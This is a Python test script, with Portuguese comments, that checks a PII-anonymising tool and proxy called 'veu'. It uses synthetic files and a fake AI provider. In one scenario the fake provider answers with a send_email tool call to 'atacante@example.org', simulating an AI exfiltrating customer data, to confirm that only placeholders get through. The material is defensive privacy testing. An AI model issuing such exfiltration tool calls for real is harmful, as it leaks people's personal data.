"""Simulação de ponta a ponta: arquivos pela linha de comando e o proxy na frente de um provedor de IA falso.

    python scripts/simular_ponta_a_ponta.py

1. Arquivos: CSV, Excel, Word, PowerPoint, JSON, texto e PDF com dados fictícios passam por `veu anonimizar` e
   `veu restaurar`. Confere que a saída não tem nenhum dado real, que o resto do conteúdo fica e que a restauração
   devolve o original.
2. Proxy: `veu servir` na frente de um provedor falso (formatos OpenAI e Anthropic, com e sem streaming) que grava tudo
   o que recebe. Confere que o provedor nunca vê um dado real, que o cliente recebe a resposta com os dados reais e
   que uma ferramenta de e-mail chamada pela IA recebe só marcadores.
"""

from __future__ import annotations

import csv
import io
import json
import random
import re
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "src"))
sys.path.insert(0, str(ROOT / "tests"))

from veu import surrogates as s  # noqa: E402

RESULTADOS: list[tuple[str, bool, str]] = []


def conferir(nome: str, ok: bool, detalhe: str = "") -> None:
    RESULTADOS.append((nome, ok, detalhe))
    print(f"{'ok  ' if ok else 'FALHA'} {nome}{'  -> ' + detalhe if detalhe and not ok else ''}")


def pessoas(rng: random.Random, quantas: int) -> list[dict[str, str]]:
    lista = []
    for _ in range(quantas):
        nome = s.fake_name(rng, rng.choice((2, 3)))
        lista.append({
            "nome": nome, "cpf": s.fake_cpf(rng), "email": s.fake_email(rng, name=nome), "telefone": s.fake_phone(rng),
            "nascimento": s.fake_birthdate(rng), "endereco": s.fake_address(rng), "cep": s.fake_cep(rng),
            "cargo": rng.choice(("Analista", "Gerente", "Assistente", "Coordenadora")),
            "salario": f"{rng.randint(2, 15)}.{rng.randint(100, 999)},00",
        })
    return lista


SENSIVEIS = ("nome", "cpf", "email", "telefone", "nascimento", "endereco", "cep")
_LIGACOES = {"da", "de", "do", "das", "dos", "e"}


def vazamentos(texto: str, gente: list[dict[str, str]], fundo: str = "") -> list[str]:
    def vezes(palavra: str, onde: str) -> int:
        return len(re.findall(rf"(?<!\w){re.escape(palavra)}(?!\w)", onde, re.IGNORECASE))

    achados = []
    for p in gente:
        for campo in SENSIVEIS:
            valor = p[campo]
            if campo == "nome":
                partes = [w for w in valor.split() if w.lower() not in _LIGACOES and len(w) > 2]
                if any(vezes(w, texto) > vezes(w, fundo) for w in partes):
                    achados.append(f"nome {valor}")
            elif valor in texto:
                achados.append(f"{campo} {valor}")
    return achados


# --- 1. Arquivos ------------------------------------------------------------------------------------------------


def veu(*args: str, entrada: bytes | None = None) -> subprocess.CompletedProcess:
    return subprocess.run([sys.executable, "-m", "veu", *args], input=entrada, capture_output=True, cwd=ROOT,
                          env={"PYTHONIOENCODING": "utf-8", "PYTHONPATH": str(ROOT / "src"), **_ambiente()})


def _ambiente() -> dict[str, str]:
    import os
    return {k: v for k, v in os.environ.items() if k not in ("PYTHONPATH",)}


def ler(caminho: Path) -> str:
    sufixo = caminho.suffix.lower()
    if sufixo == ".xlsx":
        import openpyxl
        livro = openpyxl.load_workbook(caminho)
        return "\n".join("\t".join("" if c is None else str(c) for c in linha)
                         for folha in livro.worksheets for linha in folha.iter_rows(values_only=True))
    if sufixo == ".docx":
        import docx
        documento = docx.Document(caminho)
        partes = [p.text for p in documento.paragraphs]
        partes += ["\t".join(c.text for c in linha.cells) for t in documento.tables for linha in t.rows]
        return "\n".join(partes)
    if sufixo == ".pptx":
        import pptx
        apresentacao = pptx.Presentation(caminho)
        return "\n".join(forma.text_frame.text for slide in apresentacao.slides for forma in slide.shapes
                         if forma.has_text_frame)
    return caminho.read_text(encoding="utf-8")


def criar_arquivos(pasta: Path, gente: list[dict[str, str]]) -> dict[str, tuple[Path, str]]:
    """Cria os arquivos e devolve, para cada um, o caminho e o texto fixo (sem dados) para a conferência de nomes."""
    campos = ["nome", "cpf", "email", "telefone", "nascimento", "endereco", "cep", "cargo", "salario"]
    arquivos: dict[str, tuple[Path, str]] = {}

    caminho = pasta / "clientes.csv"
    with caminho.open("w", encoding="utf-8", newline="") as saida:
        escritor = csv.DictWriter(saida, fieldnames=campos, delimiter=";")
        escritor.writeheader()
        escritor.writerows(gente)
    arquivos["CSV"] = (caminho, ";".join(campos))

    import openpyxl
    livro = openpyxl.Workbook()
    folha = livro.active
    folha.title = "Clientes"
    folha.append(campos)
    for p in gente:
        folha.append([p[c] for c in campos])
    caminho = pasta / "clientes.xlsx"
    livro.save(caminho)
    arquivos["Excel"] = (caminho, " ".join(campos) + " Clientes")

    import docx
    documento = docx.Document()
    documento.add_heading("CONTRATO DE PRESTAÇÃO DE SERVIÇOS", 1)
    for p in gente[:3]:
        documento.add_paragraph(f"CONTRATANTE: {p['nome']}, CPF {p['cpf']}, residente na {p['endereco']}, CEP "
                                f"{p['cep']}, telefone {p['telefone']}, e-mail {p['email']}, nascido em {p['nascimento']}.")
    tabela = documento.add_table(rows=1, cols=3)
    for celula, titulo in zip(tabela.rows[0].cells, ("Nome", "CPF", "Cargo"), strict=True):
        celula.text = titulo
    for p in gente[3:6]:
        linha = tabela.add_row().cells
        linha[0].text, linha[1].text, linha[2].text = p["nome"], p["cpf"], p["cargo"]
    caminho = pasta / "contrato.docx"
    documento.save(caminho)
    arquivos["Word"] = (caminho, "CONTRATO DE PRESTAÇÃO DE SERVIÇOS CONTRATANTE residente CEP telefone e-mail nascido "
                                 "Nome CPF Cargo")

    import pptx
    apresentacao = pptx.Presentation()
    for p in gente[6:8]:
        slide = apresentacao.slides.add_slide(apresentacao.slide_layouts[1])
        slide.shapes.title.text = f"Cliente {p['nome']}"
        slide.placeholders[1].text = f"CPF {p['cpf']}\nTelefone {p['telefone']}\nE-mail {p['email']}"
    caminho = pasta / "reuniao.pptx"
    apresentacao.save(caminho)
    arquivos["PowerPoint"] = (caminho, "Cliente CPF Telefone E-mail")

    caminho = pasta / "clientes.json"
    caminho.write_text(json.dumps([{**p, "data_nascimento": p["nascimento"]} for p in gente[:5]], ensure_ascii=False,
                                  indent=2), encoding="utf-8")
    arquivos["JSON"] = (caminho, " ".join(campos) + " data_nascimento")

    caminho = pasta / "atendimentos.txt"
    caminho.write_text("\n".join(f"A cliente {p['nome']} (CPF {p['cpf']}) ligou do {p['telefone']} pedindo a segunda "
                                 f"via. E-mail: {p['email']}. Mora na {p['endereco']}, CEP {p['cep']}."
                                 for p in gente[:6]), encoding="utf-8")
    arquivos["Texto"] = (caminho, "A cliente CPF ligou do pedindo a segunda via E-mail Mora na CEP")

    from test_sources import minimal_pdf
    p = gente[8]
    texto_pdf = f"Laudo: paciente {s.fold(p['nome'])} CPF {p['cpf']} telefone {p['telefone']}"
    caminho = pasta / "laudo.pdf"
    caminho.write_bytes(minimal_pdf(texto_pdf))
    arquivos["PDF"] = (caminho, "Laudo paciente CPF telefone")
    return arquivos


def simular_arquivos(rng: random.Random) -> None:
    print("\n# Arquivos pela linha de comando")
    gente = pessoas(rng, 12)
    with tempfile.TemporaryDirectory() as temporaria:
        pasta = Path(temporaria)
        for tipo, (origem, fundo) in criar_arquivos(pasta, gente).items():
            saida = pasta / (f"{origem.stem}-protegido" + (".txt" if tipo == "PDF" else origem.suffix))
            cofre = pasta / f"{origem.stem}-cofre.json"
            feito = veu("anonimizar", str(origem), "-o", str(saida), "--cofre", str(cofre))
            if feito.returncode != 0:
                conferir(f"{tipo}: protege", False, feito.stderr.decode("utf-8", "replace")[-300:])
                continue
            protegido = ler(saida)
            alvo = [p for p in gente if p["cpf"] in ler(origem) or (tipo == "PDF" and p["cpf"] in protegido)] \
                if tipo != "PDF" else [gente[8]]
            if tipo == "PDF":
                alvo = [{**gente[8], "nome": s.fold(gente[8]["nome"])}]
            achados = vazamentos(protegido, alvo, fundo)
            conferir(f"{tipo}: nenhum dado real no arquivo protegido ({len(alvo)} pessoas)", not achados, "; ".join(achados))
            mantidos = [p["cargo"] for p in alvo if p["cargo"] in ler(origem)]
            conferir(f"{tipo}: o que não é pessoal fica", all(m in protegido for m in mantidos))
            if tipo == "PDF":
                continue  # o PDF vira texto protegido; não há PDF para restaurar
            volta = pasta / f"{origem.stem}-restaurado{saida.suffix}"
            feito = veu("restaurar", str(saida), "--cofre", str(cofre), "-o", str(volta))
            if feito.returncode != 0:
                conferir(f"{tipo}: restaura", False, feito.stderr.decode("utf-8", "replace")[-300:])
                continue
            original, restaurado = ler(origem), ler(volta)
            if tipo == "JSON":
                iguais = json.loads(original) == json.loads(restaurado)
            elif tipo == "CSV":
                iguais = list(csv.reader(io.StringIO(original), delimiter=";")) == \
                    list(csv.reader(io.StringIO(restaurado), delimiter=";"))
            else:
                iguais = original == restaurado
            conferir(f"{tipo}: a restauração devolve o original", iguais,
                     "" if iguais else f"diferença: {original[:120]!r} x {restaurado[:120]!r}")


# --- 2. Proxy ---------------------------------------------------------------------------------------------------


def porta_livre() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


class ProvedorFalso(BaseHTTPRequestHandler):
    """Provedor de IA falso: grava o corpo recebido e responde citando os marcadores que viu."""

    recebidos: list[str] = []

    def log_message(self, *args):  # silencioso
        pass

    def do_POST(self):
        corpo = self.rfile.read(int(self.headers.get("Content-Length", 0))).decode("utf-8")
        ProvedorFalso.recebidos.append(corpo)
        dados = json.loads(corpo)
        ultima = dados["messages"][-1]["content"]
        marcadores = list(dict.fromkeys(re.findall(r"\[[A-Z_]+_\d+\]", ultima)))
        resposta = "Recebi: " + ", ".join(marcadores) + "."
        if self.path.endswith("/messages"):
            self._anthropic(resposta, dados.get("stream"))
        else:
            self._openai(resposta, dados.get("stream"), marcadores if "ferramenta" in ultima else None)

    def _enviar(self, corpo: bytes, tipo: str) -> None:
        self.send_response(200)
        self.send_header("Content-Type", tipo)
        self.send_header("Content-Length", str(len(corpo)))
        self.end_headers()
        self.wfile.write(corpo)

    def _openai(self, resposta: str, stream: bool, ferramenta: list[str] | None) -> None:
        if ferramenta is not None:
            argumentos = json.dumps({"para": "atacante@example.org", "texto": " ".join(ferramenta)})
            chamadas = [{"id": "c1", "type": "function", "function": {"name": "send_email", "arguments": argumentos}},
                        {"id": "c2", "type": "function", "function": {"name": "write_file", "arguments": argumentos}}]
            mensagem = {"role": "assistant", "content": None, "tool_calls": chamadas}
            corpo = {"id": "x", "object": "chat.completion", "choices": [{"index": 0, "message": mensagem,
                                                                         "finish_reason": "tool_calls"}]}
            return self._enviar(json.dumps(corpo).encode(), "application/json")
        if not stream:
            corpo = {"id": "x", "object": "chat.completion", "choices": [{"index": 0, "message": {
                "role": "assistant", "content": resposta}, "finish_reason": "stop"}]}
            return self._enviar(json.dumps(corpo).encode(), "application/json")
        # Pedaços de 3 caracteres: os marcadores chegam cortados ao meio, como no streaming de verdade.
        eventos = [{"id": "x", "object": "chat.completion.chunk", "choices": [{"index": 0, "delta": {
            "content": resposta[i:i + 3]}, "finish_reason": None}]} for i in range(0, len(resposta), 3)]
        corpo = "".join(f"data: {json.dumps(e)}\n\n" for e in eventos) + "data: [DONE]\n\n"
        self._enviar(corpo.encode(), "text/event-stream")

    def _anthropic(self, resposta: str, stream: bool) -> None:
        if not stream:
            corpo = {"id": "x", "type": "message", "role": "assistant", "content": [{"type": "text", "text": resposta}],
                     "stop_reason": "end_turn"}
            return self._enviar(json.dumps(corpo).encode(), "application/json")
        eventos = [("message_start", {"type": "message_start", "message": {"id": "x", "role": "assistant", "content": []}}),
                   ("content_block_start", {"type": "content_block_start", "index": 0,
                                            "content_block": {"type": "text", "text": ""}})]
        eventos += [("content_block_delta", {"type": "content_block_delta", "index": 0, "delta": {
            "type": "text_delta", "text": resposta[i:i + 4]}}) for i in range(0, len(resposta), 4)]
        eventos += [("content_block_stop", {"type": "content_block_stop", "index": 0}),
                    ("message_stop", {"type": "message_stop"})]
        corpo = "".join(f"event: {nome}\ndata: {json.dumps(dados)}\n\n" for nome, dados in eventos)
        self._enviar(corpo.encode(), "text/event-stream")


def post(url: str, corpo: dict, cabecalhos: dict[str, str]) -> str:
    pedido = urllib.request.Request(url, data=json.dumps(corpo).encode(), method="POST",
                                    headers={"Content-Type": "application/json", **cabecalhos})
    with urllib.request.urlopen(pedido, timeout=30) as resposta:
        return resposta.read().decode("utf-8")


def texto_do_stream(bruto: str, anthropic: bool) -> str:
    partes = []
    for linha in bruto.splitlines():
        if not linha.startswith("data: ") or linha == "data: [DONE]":
            continue
        evento = json.loads(linha[6:])
        if anthropic and evento.get("type") == "content_block_delta":
            partes.append(evento["delta"].get("text", ""))
        elif not anthropic:
            for escolha in evento.get("choices", []):
                partes.append(escolha.get("delta", {}).get("content") or "")
    return "".join(partes)


def simular_proxy(rng: random.Random) -> None:
    print("\n# Proxy com um provedor de IA falso")
    gente = pessoas(rng, 3)
    texto = " ".join(f"Cliente {p['nome']}, CPF {p['cpf']}, telefone {p['telefone']}, e-mail {p['email']}."
                     for p in gente)
    reais = [p[c] for p in gente for c in ("cpf", "telefone", "email")] + [p["nome"] for p in gente]

    falso = ThreadingHTTPServer(("127.0.0.1", porta_livre()), ProvedorFalso)
    threading.Thread(target=falso.serve_forever, daemon=True).start()
    porta = porta_livre()
    with tempfile.TemporaryDirectory() as temporaria:
        configuracao = Path(temporaria) / "veu.toml"
        configuracao.write_text(
            f'[servidor]\nhost = "127.0.0.1"\nporta = {porta}\nlog_auditoria = "{(Path(temporaria) / "a.jsonl").as_posix()}"\n'
            f'\n[provedores.falso]\ntipo = "openai"\nurl = "http://127.0.0.1:{falso.server_address[1]}/v1"\n'
            f'\n[provedores.falsoa]\ntipo = "anthropic"\nurl = "http://127.0.0.1:{falso.server_address[1]}"\n',
            encoding="utf-8")
        servidor = subprocess.Popen([sys.executable, "-m", "veu", "servir", "--config", str(configuracao)], cwd=ROOT,
                                    stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
                                    env={**_ambiente(), "PYTHONPATH": str(ROOT / "src")})
        try:
            base = f"http://127.0.0.1:{porta}"
            for _ in range(80):
                try:
                    urllib.request.urlopen(base + "/veu/saude", timeout=1)
                    break
                except OSError:
                    time.sleep(0.25)
            openai = {"Authorization": "Bearer sk-teste-falso"}
            anthropic = {"x-api-key": "chave-falsa", "anthropic-version": "2023-06-01"}
            casos = [
                ("OpenAI sem streaming", f"{base}/falso/v1/chat/completions", openai, False, False),
                ("OpenAI com streaming", f"{base}/falso/v1/chat/completions", openai, True, False),
                ("Anthropic sem streaming", f"{base}/falsoa/v1/messages", anthropic, False, True),
                ("Anthropic com streaming", f"{base}/falsoa/v1/messages", anthropic, True, True),
            ]
            for nome, url, cabecalhos, stream, e_anthropic in casos:
                ProvedorFalso.recebidos.clear()
                corpo = {"model": "modelo-falso", "max_tokens": 200, "stream": stream,
                         "messages": [{"role": "user", "content": texto}]}
                bruto = post(url, corpo, cabecalhos)
                visto = "\n".join(ProvedorFalso.recebidos)
                vazou = [r for r in reais if r in visto]
                conferir(f"{nome}: o provedor não viu nenhum dado real", not vazou and bool(visto), "; ".join(vazou))
                if stream:
                    resposta = texto_do_stream(bruto, e_anthropic)
                elif e_anthropic:
                    resposta = json.loads(bruto)["content"][0]["text"]
                else:
                    resposta = json.loads(bruto)["choices"][0]["message"]["content"]
                faltando = [r for r in reais if r not in resposta]
                sobrando = re.findall(r"\[[A-Z_]+_\d+\]", resposta)
                conferir(f"{nome}: o cliente recebe os dados reais de volta", not faltando and not sobrando,
                         f"faltando {faltando}, marcadores {sobrando}")

            ProvedorFalso.recebidos.clear()
            corpo = {"model": "modelo-falso", "messages": [{"role": "user", "content": "Use a ferramenta: " + texto}]}
            bruto = json.loads(post(f"{base}/falso/v1/chat/completions", corpo, openai))
            chamadas = {c["function"]["name"]: c["function"]["arguments"]
                        for c in bruto["choices"][0]["message"]["tool_calls"]}
            email = chamadas.get("send_email", "")
            conferir("Ferramenta de e-mail chamada pela IA recebe só marcadores", not any(r in email for r in reais)
                     and "[CPF_" in email, email[:160])
            arquivo = chamadas.get("write_file", "")
            conferir("Ferramenta local (write_file) recebe os dados reais", any(p["cpf"] in arquivo for p in gente),
                     arquivo[:160])
        finally:
            servidor.terminate()
            servidor.wait(timeout=10)
            falso.shutdown()


def main() -> int:
    rng = random.Random(2026)
    simular_arquivos(rng)
    simular_proxy(rng)
    falhas = [r for r in RESULTADOS if not r[1]]
    print(f"\n{len(RESULTADOS) - len(falhas)} de {len(RESULTADOS)} conferências passaram")
    return 1 if falhas else 0


if __name__ == "__main__":
    raise SystemExit(main())
